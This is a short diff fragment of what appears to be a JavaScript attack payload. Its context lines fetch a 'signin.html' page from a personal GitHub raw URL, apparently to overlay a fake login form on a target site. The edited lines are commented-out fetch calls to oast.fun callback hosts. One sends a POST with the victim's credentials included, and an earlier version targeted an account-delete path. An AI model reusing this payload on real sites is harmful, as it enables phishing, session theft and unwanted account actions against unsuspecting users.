@@ -16,7 +16,7 @@ fetch("https://raw.githubusercontent.com/Usama3423/web/main/signin.html").then(r
   }, true);
 })
 
-// fetch("https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun/users", { "method": "POST", "credentials": "include"})
+// fetch("https://jksuolqicsmqvwaztvtw16cqryiysowt1.oast.fun", { "method": "POST", "credentials": "include"})
 
 
-// fetch("https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun/user/settings/delete")
+// fetch("https://jksuolqicsmqvwaztvtw16cqryiysowt1.oast.fun")
